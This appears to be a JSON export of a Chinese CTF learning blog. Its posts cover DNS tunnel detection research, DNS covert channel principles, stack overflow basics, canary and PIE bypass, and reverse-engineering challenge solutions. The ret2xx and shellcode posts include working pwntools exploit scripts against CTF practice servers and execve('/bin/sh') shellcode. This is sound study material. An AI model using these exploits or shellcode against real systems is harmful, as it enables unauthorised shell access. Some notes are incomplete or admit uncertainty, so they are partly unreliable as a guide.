[{"id":"31531518f5b44460dcc99773a48a9a22","title":"DNS隧道文献调研","content":"\n\nDNS隧道文献调研前两天学习了点DNS隧道的知识，这两天就调研了一下DNS隧道的检测相关手段，主要涉及人工智能和流量检测的\n低速DNS隐蔽信道通信检测研究与实现研究现状检测思路主要分为两类\n\n\n\n\n\n\n\n\n\n基于通信过程特征：深度学习（基于字节的卷积神经网络，基于长短期记忆的循环神经网络，Stacking的方法）\n\n\n\n\n\n\n\n\n\n基于通信内容特征：子域名（随机森林机器学习）、基于异常检测的机器学习模型\n主要工作针对一般DNS隐蔽信道通信，提出了结合通信过程特征和通信内容特征的两阶段模型检测方案，时延低，检测效果更优\n针对低速单域名DNS隐蔽信道通信和低速多域名DNS隐蔽信道通信，在之前研究成果的基础上提出了解决方案\n在提出的检测方案之上，根据环境实际需求，实现了DNS隐蔽信道通信检测系统\n数据集对活跃的开源DNS隐蔽信道工具出发，搭建实际环境进行数据收集\n对五种DNS隐蔽信道工具进行收集，包括Iodine、DNScat2、DNSteal、DNS2TCP和Glimpse。\n在DNS流量监控体系统以及校园网网关手机了DNS流量白样本。\n数据集大小为98008700条，其中165000条黑样本，9635970条白样本\n训练集，测试集和验证集占比为70%，15%，15%\n技术要点\n\n\n\n\n\n\n\n\n异常检测：对不符合预期的观测值进行识别，异常分为三类，单点异常，上下文异常，集体异常\n\n\n\n\n\n\n\n\n\n孤立森林算法：是异常检测领域的重要算法之一，利用了异常数据的两个定量特性，一是异常数据点量少且占比小，二是异常点的属性值与普通点的属性值有很大不同。孤立森林为数据集构建了一个“孤立树”(iTree)的组合，异常时在iTree上具有较短平均路径长度的点\n网络隐蔽信道检测关键技术研究这个不光是DNS隧道，好像还研究了其他隧道\n主要工作隐蔽信道检测全分类和关联分析\n提出一种基于集成检测的隐蔽信道盲信道检测方法\n提出一种基于迁移学习的APT隐蔽信道识别技术\n数据集\n\n\n序号\n内容\n介绍\n\n\n\n1\n隐蔽信道开源工具+匹配环境噪音\n开源数据集自主可控，环境噪音闭合形成搭配的隐蔽信道测试应用环境\n\n\n2\n僵尸网络C&amp;C数据集\n僵尸网络作者为保证僵尸网络的存活概率，其通信经过精心设计\n\n\n3\n隐蔽信道红队工具\n在攻防对抗中红队为规避审计方的防御才用的隐蔽攻击手段（与1有重复）\n\n\n4\n正常流量\n正常数据流量作为参考对比\n\n\n技术要点集成检测、迁移学习\n基于深度学习的DNS隐蔽隧道检测研究主要工作针对单个DNS请求识别DNS隧道攻击的问题，提出了基于神经网络的DNS隧道检测方案\n以优化提升检测效果为目的，提出使用多模型融合方案和基于生成对抗网络的优化策略，并进一步从攻击者角度出发，提升模型应对DNS隧道变种的能力，实现识别基于单词变换的DNS隧道变种。\n从实际出发，实现了基于深度学习的攻击检测平台\n数据集Alexa之前公开的域名数据集，获得772331白样本\n从github上收集了10000条DNS隧道数据，包含了iodine、powercat、keyoka、ozymandns等四种DNS隧道数据\n建立DNS隧道仿真环境进行数据采集，收集了323311条DNS隧道数据\n技术要点\n\n\n\n\n\n\n\n\n基于神经网络的DNS隧道检测方案：1.数据预处理 2.构建多种神经网络模型，实现基于神经网络的DNS隧道检测模型 3.建立检验模型的综合验证方法\n\n\n\n\n\n\n\n\n\nDNS隧道检测优化方案：1. 使用多模型融合方案，提高检测效果 2.使用基于GAN的优化策略，生成对抗网络，提高检测能力\n\n\n\n\n\n\n\n\n\n设计了一个大数据DNS隧道检测系统平台：1.DNS隧道攻击仿真环境 2.大数据环境下网络安全分析数据提取 3.数据持久化存储 4.元数据可视化分析监控 5.深度学习算法基础平台\nDNS隐蔽信道异常行为检测系统的设计与实现主要工作针对现有研究方法忽略了DNS响应消息而导致漏报的问题，提出了基于流量的DNS隐蔽信道异常行为监测方案\n为了对模型识别出的异常DNS隐蔽信道数据作进一步的威胁类型判断，本文建立规则库并采取多协议样本分析的方法构建了威胁类型判定体系。\n为了更好地满足交互式检测DNS隐蔽信道异常行为的市场需求，本文设计并实现了DNS隐蔽信道异常行为检测系统。\n数据集使用四种隐蔽信道工具和一种恶意软件模拟DNS隐蔽信道通信，使用wireshark抓包\n\n\n\n样本类别\n数量(条)\n\n\n\n正常DNS流量\n10000\n\n\niodine\n4000\n\n\ndnsteal\n500\n\n\ndnscat2\n4000\n\n\ndns2tcp\n500\n\n\nGlimpse\n1000\n\n\n技术要点基于规则的检测、基于机器学习的检测\n","slug":"CTF/web/DNS隧道文献调研","date":"2022-01-22T03:46:02.000Z","categories_index":"CTF/WEB","tags_index":"CTF WEB","author_index":"S1eepy"},{"id":"c96bc3988ac1e521f9bca4fae6eb257f","title":"初探DNS隧道","content":"\n\n初探DNS隧道本文主要探究一下DNS协议，隐蔽信道实现原理，以及一些相关工具等\n从DNS协议说起域名系统(Domain Name System，DNS)是一种将域名和IP地址进行互相映射的一个分布式数据库，使用户能方便的直接通过域名访问互联网服务，而不需要去记一大串IP。通过主机名最终得到该IP地址的过程叫做域名解析。\nDNS协议是一种为其他应用层协议服务的一个应用层协议，比如HTTP、SMTP、FTP等，主要就是将这些域名解析为IP地址。DNS协议主要基于\n域名系统域名系统具有唯一性，命名采用层次结构，比如www.baidu.com这个域名：com是顶级域名，baidu是二级域名，www是三级域名。\n域名解析域名解析就是将域名映射到IP地址的过程，进行DNS解析时使用的通常是UDP协议，但是在主服务器向备份服务器同步数据的时候使用的是TCP协议，DNS协议使用的端口号是53。\n1.递归查询主机向本地域名服务器发送请求，然后等待最终结果即可，本地域名服务器若未查询到对应IP，会作为DNS客户端向其他域名服务器查询，直到找到对应IP。\n2.迭代查询主机向本地域名服务器发送请求，然后等待最终结果。本地域名服务器会直接向根域名服务器发起域名查询请求，根域名服务器告诉本地域名服务器下一个要查询的DNS服务器的IP地址，然后本地域名服务器再去对应IP查询，直到获取到最终的IP地址。\nDNS隐蔽信道为什么要用隐蔽通道在复杂或者相对安全的网络环境中，防守方对于内部网络出去的流量是有严格管控的，一般会通过防火墙来实现，因此攻击者拿到内网主机的权限后想要进行持久控制是比较困难的，因为一些敏感操作（比如命令执行、数据外带等等）会触发防火墙或者安全设备的规则。因此通过DNS隐蔽隧道可以在不被防火墙检测的情况下进行命令执行或者数据外带，从而实现长期控制。\n基本原理攻击者使用DNS报文的请求和响应消息作为传输数据的通信载体，来实现隐蔽通信。首先攻击者需要控制某个域名的域名解析服务器，让对某个域名的解析全都发送到该已经被控制的服务器上。最终在控制端和受控机器之间就成功建立起了一条隐蔽通信的通道。\n隐蔽信道的维护和通信都依赖于DNS查询请求和响应消息。由于目前DNS是互联网中不可缺少的服务，且主流的防火墙都没有设置过滤DNS流量的服务，因此使用DNS隧道能做到穿透防火墙。\nDNS隐蔽信道类型按照实现方式可以分为两类：\n\n\n\n\n\n\n\n\n\n1.直连信道：客户端直接与控制的DNS服务器进行连接，使用DNS协议封装要传输的数据，利用DNS请求与响应实现两者的通信。优点是十分高效，缺点是隐蔽性较弱，容易被探测到然后阻断。\n\n\n\n\n\n\n\n\n\n2.中继信道：利用DNS迭代查询实现，比直连更加隐蔽也更容易成功部署。但是由于需要多次跳转，因此效率比较低。\n实现DNS隐蔽信道需要注意一下几点：\n\n规避DNS缓存机制\n可以将DNS的请求域和响应域以及查询类型来作为信息载体\n由于域名系统采用CS机制，因此Server端不会主动发起连接请求，而是Client端定时向Server发送请求以保持通信\n\nDNS隐蔽信道工具\n\n\n工具\n说明\n\n\n\ndns2tcp\n支持直连模式，效率较低\n\n\ndnscat2\n可实现数据传输、文件操作等命令和控制功能。支持直连和中继两种模式\n\n\nIodine\n支持直连和中继两种模式，在编码、请求类型上提供了更丰富的选择，速度较快\n\n\nOzymandns\n结合ssh做文件传输。请求类型是TXT，使用base32编码，响应用base64编码\n\n\ndnsShell\n支持直连和中继两种模式\n\n\nreverseDnsShell\n基于直接连接的DNS信道木马\n\n\nDNS检测基于规则检测基于规则检测又分为两种：字符串匹配检测、基于特征检测\n前者比较准确，短时间内十分有效，不过长时间后若攻击者更改攻击方式，则可能会逃逸检测\n后者时效性更强，不过可能产生误报\nBotDAD统计分析了15种DNS行为特征\n\n\n\n序号\nDNS特征\n描述\n\n\n\n1\n每小时DNS请求的数量\n受感染的僵尸主机每小时的请求数量往往高于正常主机。\n\n\np2\n每小时不同的DNS请求数\n感染DGA恶意软件的主机往往比普通主机具有更多不同的请求。\n\n\np3\n单个域的最大请求数\n帮助检测DNS隧道，敏感信息通过DNS协议传输。\n\n\np4\n每分钟平均请求数\n用于检测受恶意软件感染的计算机，该计算机不使用短暂的DNS请求，而是使用休眠间隔定期对DNS请求做出贡献。                 它的计算方法是将主机发送的请求数除以主机处于活动状态并使用DNS服务的持续时间。\n\n\np5\n每分钟最多请求数\n帮助检测感染恶意软件的僵尸程序，这些恶意软件使用短暂的DNS请求通过域生成算法生成的多个URL与C＆C服务器进行通信。\n\n\np6\nMX记录查询数\n是网络中基于垃圾邮件的僵尸网络的强有力指标。\n\n\np7\nPTR记录（从ip地址到域名的一条记录）查询数\n有助于检测网络中存在异常行为的主机以及可能的感染。\n\n\np8\n查询的不同DNS服务器的数量\n有助于检测网络中具有异常行为的机器，因为标准系统查询多个DNS服务器的情况并不常见。TLD: top level domain，顶级域名SLD: second level domain，二级域名\n\n\np9\n不同TLD请求的数量\n在检测基于DGA的机器人方面非常有效，这些机器人不仅生成具有不同二级域的随机域，还生成具有不同顶级域名的随机域。\n\n\np10\n不同SLD请求的数量\n是网络中存在基于DGA的机器人的强烈指示。\n\n\np11\n唯一性比率\n是在主机每小时发送至少1000个请求的假设下，发送的请求数与发送的不同请求数之比。\n\n\np12\nFailed/NXDOMAIN请求的数量\n是网络中主机感染的一个非常强的指标。它通过主机维护响应代码等于DNS_RCODE_NXDOMAIN的响应数。\n\n\np13\n已解析IP地址的不同城市数量\n是一个强烈的异常指标，尤其是当IP地址分布在各个城市时。使用Maxmind数据库（“Geo2 Databases | MaxMi，2017”）获得城市映射的IP地址。\n\n\np14\n已经解析的ip地址的不同国家数量\n\n\n\np15\nFlux ratio\n在主机发送至少100个查询并且已收到至少100个响应的条件下，发送的不同请求与解析的不同ip地址的比率。\n\n\n基于机器学习检测分为两种，一种是自然语言处理，一种是统计机器学习\n参考文献孙鹿丽. DNS隐蔽信道异常行为检测系统的设计与实现[D].北京邮电大学,2021.DOI:10.26969/d.cnki.gbydu.2021.001579.\nhttps://www.freebuf.com/articles/database/210250.html\n","slug":"CTF/web/初探DNS隧道","date":"2022-01-20T04:34:19.000Z","categories_index":"CTF/WEB","tags_index":"CTF WEB","author_index":"S1eepy"},{"id":"4773296421a8fb9509157a21ee5da267","title":"栈溢出进阶","content":"\n\n栈溢出进阶stack smash在glibc-2.23可行，后续版本不可行了\n在报错时会泄漏出文件名，原码中的__fortify_fail里有个__libc_massgae将命令行输入参数作为调试结果输出了，因此可以用这个命令行的参数进行格式化字符串输出，将我们想要的libc地址，然后可以将flag读入内存然后用格式化字符串输出\nwdb2018_guess多线程下爆破创建新进程时父进程的地址空间中的内容给子进程，调用fork后子进程与父进程的执行顺序是无法确定的，子进程无法通过fork创建子进程\nfork有三种返回值：父进程中fork返回子进程的ID，子进程中fork返回0，出现错误fork返回负值\n通过子进程的输出来逐位爆破canary\nstack pivot","slug":"CTF/pwn/栈溢出进阶","date":"2022-01-20T01:17:23.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"e75c21f70c678b134f6a0bde8c339180","title":"ret2xx","content":"\n\nret2xx什么是ret2xx泛指ret2text，ret2shellcode，ret2syscall，ret2libc，ret2csu，其中ret2是return to的谐音，可以使用利用eip指针的方法来获取权限\nROPReturn Oriented Programming\nROP指通过修改Gadgets的ret结尾的指令顺序来实施攻击，需要如下条件：\n1.程序存在栈溢出，能控制返回地址\n2.可以找到满足条件的gadgets，而且知道gadgets的地址\nret2text对.text节的利用，会使用程序中已有的代码来进行攻击\n\n\n\n\n\n\n\n\n\n进程存在危险函数如system(“/bin”)或execv(“/bin/sh”,0,0)的片段，可以直接劫持返回地址到目标函数地址上。从而getshell。\n例题jarvisoj_level2首先找system函数的地址和/bin/sh字符串的地址\n\n\n构造思路如下，先用0x88把缓冲区沾满，然后用0x4把ebp占满，然后修改返回地址为system(“/bin/sh”)即system的函数地址加上/bin/sh的地址，脚本编写时可以用pwntools的ELF模块\nfrom pwn import *\nelf = ELF(\"level2\")\np = remote(\"node4.buuoj.cn\", 28053)\n\np.recvuntil(\"Input:\\n\")\n\npayload = b'a' * 0x88 + b'b' * 0x4 + p32(0x08048320) + p32(0x0) + p32(0x804A024)\n# payload分为五部分\n# 第一块0x88个a填充栈到溢出\n# 第二块0x4个b填充ebp\n# 第三块为system函数地址\n# 第四块为system的返回地址(随便填任意值就行，不然会EOF)\n# 第五块为/bin/sh的地址指针\np.send(payload)\n\np.interactive()\n\n例题jarvisoj_level2_x64成因和32位的一样，区别在于64位函数在调用传参时先试用寄存器(依次为rdi,rsi,rdx,rcx,r8,r9)，那么我们将rdi指向/bin/sh即可\n设置rdi的方法是使用pop rdi; ret代码片段，用ropgagdet可以找\nret2shellcode控制程序来执行shellcode代码，一般而言shellcode需要我们自己填充\n例题jarvisoj_level1首先题目会泄漏buf的首地址，也就是我们每次都可以知道buf的地址，只要能将buf的返回地址改成我们需要的shellcode即可，然后将shellcode的返回地址改为buf的地址（至于为什么我也不知道，明天问一问）\nfrom pwn import *\ncontext(os='linux', arch='i386')\nfilepath = './level1'\n\n# p = process(filepath)\np = remote(\"node4.buuoj.cn\", 26859)\np.recvuntil(\"What's this:\")\nbuf = int(p.recv(10), 16)\n\nshellcode = asm(shellcraft.sh())\npayload = shellcode\npayload = payload.ljust(0x88+4,b'a')+p32(buf)\n# 最后一处的buf是作为shellcode的返回地址的\n# 所以为什么要这样做呢。。\np.send(payload)\np.interactive()\n\n\n\nret2syscall控制程序执行系统调用获取shell\n前提是系统存在0x80等中断类似触发系统调用的情况\n\n\n\n\n\n\n\n\n\n用户进程在执行系统调用前，先把系统调用名（实际上是系统调用号）、输入参数等放到寄存器上(EBX,ECX等寄存器)然后发出int 0x80指令，即触发xxx号中断系统暂停用户进程，根据xxx号中断找到中断服务程序，这个程序名就叫system_call()system_call()接着执行。它会从寄存器中找到系统调用名、输入参数等，并根据系统调用上下文中找到引发系统调用的进程；执行完毕后它又会把输出结果放到寄存器中。系统恢复用户进程，进程从寄存器中取到自己想要的东西，然后继续执行。\n例题inndy_ropret2libc控制函数执行libc中的函数，通常是返回某个函数的plt或者函数的具体位置，一般情况下，我们会选择执行system(“/bin/sh”)，故而此时我们需要知道system函数的地址\n\n\n\n\n\n\n\n\n\n补一下plt的概念：GOT和PLT都是一种重定向方式，比如printf函数位于glibc动态库内，所以在编译和链接阶段，链接器无法知知道进程运行起来之后printf函数的加载地址。只有进程运运行后，printf函数的地址才能确定。\n\n\n\n\n\n\n\n\n\nlibc是Linux下的ANSI C的函数库。ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。这个库可以根据 头文件划分为 15  个部分，其中包括：字符类型 ()、错误码()、 浮点常数 ()、数学常数 ()、标准定义 ()、 标准 I/O ()、工具函数 ()、字符串操作 ()、 时间和日期 ()、可变参数表 ()、信号 ()、 非局部跳转 ()、本地信息 ()、程序断言 ()\n因此libc存放的都是使用过的函数或者字符串，查询libc可以使用ldd[文件名查询libc文件]\n例题jarvisoj_level1ret2csu\n\n\n\n\n\n\n\n\n在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候我们很难找到每一个寄存器对应的gadgets，这时候，我们可以利用x64下的 __libc_csu_init 中的 gadgets，这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在\n也就是说，其实 ret2csu和利用libc的思路一样，都是包含的指令来达到目标\n例题level5推荐阅读https://zhuanlan.zhihu.com/p/362737337\n","slug":"CTF/pwn/ret2xx","date":"2022-01-18T11:55:26.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"5cbed18fc0178c7e2f7d933895162e2e","title":"canary_pie绕过","content":"\n\nCanary_pie绕过Canary机制介绍canary是一种用来防护栈溢出的保护机制，原理是先在函数的入口处，从fs/gs寄存器中取出一个4字节或者8字节的值存到栈上，当程序结束后再检查这个值是否和存进去的值一致\nCanary bypass只要保持canary值不变，依旧可以修改eip的值\n格式化字符串绕过canary通过格式化字符串读取canary的值\n格式化字符串C语言的printf函数一般是这么用printf(“%s”, str);这时str的内容就会被打印出来，%s就是所说的格式化字符串，将变量中的内容按照格式化字符串的规定打印出来，由于%s判断字符串结束的依据是结尾的\\x00，因此可以把输入和canary连接在一起，将canary一起打印出来。需要注意的是canary的最后一位一定时\\x00，用于防止连带输出，所以我们改的时候要把canary的最后一位也改了\n例题canary bypass\ncanary爆破程序中必须有fork函数，不断自我复制，我们可以逐位爆破，若报错则说明这一位不对，若可以接着跑下一位就能一直跑最后得出正确的canary\nStack smashing故意触发canary_ssp leak\n劫持__stack_chk_fail通过程序中的其他函数，修改got表中的__stack_chk_fail函数地址，在栈溢出后执行该函数，然后就会跳到我们想要执行的函数\nPIE机制介绍PIE是一个针对代码段(.text)，数据段(.data)，未初始化全局变量段(.bss)等固定地址的一个防护技术，如果程序开启了PIE保护，那么每次程序加载的时候都会变换加载地址，从而不能通过ROPgadget等工具解题\nPIE bypass对于开启了PIE保护的程序，所有代码段的地址都只有最后三个数是已知的，而程序加载地址一般都是以内存页为单位的，所以程序的基地址最后三个数字一定是0，也就是那些地址已知的最后三个数就是实际地址的最后三个数。根据此，虽然我们没有完整地址，但是只要我们指导最后三个数，就可以利用栈上已有的地址，只修改最后两个字节，即可绕过。\n对于绕过PIE保护的核心思想就是partial writing\n例题","slug":"CTF/pwn/canary_pie绕过","date":"2022-01-18T11:53:50.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"ce6a61e69eea25b26a44cdf9f84d23a7","title":"RE-BUU","content":"\n\nBUUCTF-Reverse刷题记录新年快乐一个upx壳，怎么看出来的还不知道，等回头学会了再补\n直接upx -d去壳，扔进idaF5看代码就是比较输入字符串和”HappyNewYear!”，因此这个字符串就是flag\nxor主函数是逻辑如下，遍历输入字符串，将当前位与前一位异或，最终得到新字符串，将新字符串与global字符串比较，因此global就是异或后的结果，将其倒过来重新异或一遍即可。\n在IDA里双击global找到结果字符串（直接看长度不太对，再点进去一次），就能找到global的值，exp如下，注意去掉最后的f（懒得写进去了）\ns = ['f', 0xa, 'k', 0xc, 'w', '&amp;', 'O', '.', '@', 0x11, 'x', 0xd, 'Z', ';', 'U', 0x11, 'p', 0x19, 'F', 0x1F, 'v', '\"', 'M', '#', 'D', 0xe, 'g', 6, 'h', 0xf, 'G', '2', 'O']\nprint(len(s))\nflag = 'f'\nfor i in range(33):\n\tif isinstance(s[i], int):\n\t\ts[i] = chr(s[i])\n\nfor i in range(32, 0, -1):\n\tflag += chr(ord(s[i - 1]) ^ ord(s[i]))\nprint(flag[0] + flag[::-1])\n\nhelloworld直接APKIDE打开找到MainActivity.smali翻到flag\nreverse3一道很简单的题目，关键是看出来v4是base64加密(受益于认真听s0uthwood师傅讲课让我一眼看了出来)，特征是一大堆移位异或，以及长为64的数组，还有和base64一样的table。\n最后根据逻辑直接反向写出脚本\nfrom base64 import b64decode\nres = 'e3nifIH9b_C@n@dH'\ndest = ''\nfor i in range(len(res)):\n\tdest += chr(ord(res[i]) - i)\nprint(dest)\nv4 = b64decode(dest.encode())\nprint(v4)\n\n不一样的flag一道迷宫题，迷宫是长为25的字符串，将其转换为5*5的二维平面走通即可\n*1111\n01000\n01010\n00010\n1111#\n\n","slug":"CTF/reverse/RE-BUU","date":"2022-01-18T07:17:52.000Z","categories_index":"CTF/REVERSE","tags_index":"CTF REVERSE","author_index":"S1eepy"},{"id":"33178a053863ba406bb965eb7a776aab","title":"shellcode","content":"\n\nshellcode什么是shellcode软件漏洞利用过程中使用一小段机器代码\n启动shell进行交互\n可能存在的问题shellcode只允许输入十几个字节\n无法调用系统函数(不知道system的地址)\n解决触发中断（0x80或者syscall）\n如何编写shellcode32位;;nasm -f elf32 i386.asm\n;;ld -m elf_i386 -o i386 i386.o\n;;objdump -d i386\nglobal _start\n_start:\n\tpush &quot;&#x2F;sh&quot;\n\tpush &quot;&#x2F;bin&quot;\n\tmov ebx, esp;;ebx&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;\n\txor edx, edx;;edx&#x3D;0\n\txor ecx, ecx;;ecx&#x3D;0\n\tmov al, 0xb;;设置al&#x3D;0xb\n\tint 0x80\n\n64位;;name -f elf64 x64.asm\n;;ld -m elf_x86 -o x64 x64.o\n;;objdump -d x64\nglobal _start\n_start:\n\tmov rbx, &#39;&#x2F;bin&#x2F;sh&#39;\n\tpush rbx\n\tpush rsp\n\tpop rdi\n\txor esi, esi\n\txor edx, edx\n\tpush 0x3b\n\tpop rax\n\tsyscall\n\npwntools快速生成shellcodefrom pwn import *\ncontext(log_level='debug',arch='i386',os='linux')\nshellcode=asm(shellcraft.sh())\n\n例题mrctf2020_shellcodeciscn_2019_s_9pwnable_orwshellcode的变形mrctf_shellcode_revengealpha3编码github.com/TaQini/alpha3.git\n","slug":"CTF/pwn/shellcode","date":"2022-01-18T04:55:28.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"b0e5183f9443ee80e444d03488f07c6f","title":"栈溢出基础","content":"\n\n栈溢出基础C语言函数调用栈栈是程序运行时一块连续的内存区域，用来保存函数运行时的状态信息，包括函数的局部变量等\n当发生函数调用时，调用函数(caller)的状态被保存在栈内，被调用函数(callee)的状态被压入调用栈的栈顶\n函数调用结束时栈顶的函数(callee)状态被弹出，栈顶恢复到调用函数(caller)的状态\n函数调用栈的内存中从高地址到低地址生长，所以栈顶内存地址在压栈时变小，退栈时变大\n寄存器\neip寄存器：下一条要被执行的指令，它所指向的指令\nesp寄存器：保存调用栈的栈顶地址\nebp寄存器：保存当前函数状态基地址\n\n函数调用过程先把参数压入栈\n然后将调用函数(caller)的下一条指令的地址作为被调用函数(callee)的返回地址压入栈中\n再将ebp的值压入栈，并将ebp寄存器的值更新为当前栈顶的地址，这样caller的ebp信息得以保存，同时ebp被更新为callee的基地址\n最后是将callee的局部变量等数据压入栈（栈溢出最经常出现的位置）\n\n函数调用结束恢复过程变化的核心任务是丢弃callee的状态，将栈顶恢复到caller的过程\n首先将局部变量从栈顶弹出，栈顶会恢复到callee的基地址\n然后caller的基地址从栈顶弹出，存到ebp内，这样caller的ebp信息得以恢复，此时栈顶指向返回地址\n再将返回地址从栈内弹出，存到eip寄存器内，这样caller的eip信息得以恢复\n栈溢出原理从上面可以看出，caller的eip完全是由返回地址控制的，只要想办法在写入局部变量时控制长度，写入到返回地址处，就能够让caller的eip调到其他地方，从而getshell\n\n\n\n\n\n\n\n\n\n缓冲区溢出：本质是向定长的缓冲区写入了超长的数据，从而导致数据覆盖了合法内存，包括栈溢出，堆溢出，data段溢出等\n栈溢出基本利用","slug":"CTF/pwn/栈溢出基础","date":"2022-01-18T04:54:11.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"a100591a1cf0e28185d19ee6ce40ac1f","title":"Learn_RE","content":"\n\nRE学习笔记记录一下寒假期间学习RE的知识\n","slug":"CTF/reverse/Learn_RE","date":"2022-01-18T04:52:25.000Z","categories_index":"CTF/REVERSE","tags_index":"CTF REVERSE","author_index":"S1eepy"},{"id":"0c0a9c1a2db47172b0f7b7bd30e860a1","title":"Learn_PWN","content":"PWN学习笔记记录一下放大三寒假期间学习PWN的知识\n","slug":"CTF/pwn/Learn_PWN","date":"2022-01-18T04:51:06.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"298a963bd623954dbff89574513140ea","title":"Learn_WEB","content":"\n\nWEB学习笔记由于之前的web笔记被火绒当病毒杀了，当时没救回来，于是乎就懒得再写一遍了，之后跟着更新就行应该\n","slug":"CTF/web/Learn_WEB","date":"2022-01-18T03:20:26.000Z","categories_index":"CTF/WEB","tags_index":"CTF WEB","author_index":"S1eepy"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2022-01-18T01:13:55.638Z","categories_index":"","tags_index":"","author_index":"S1eepy"}]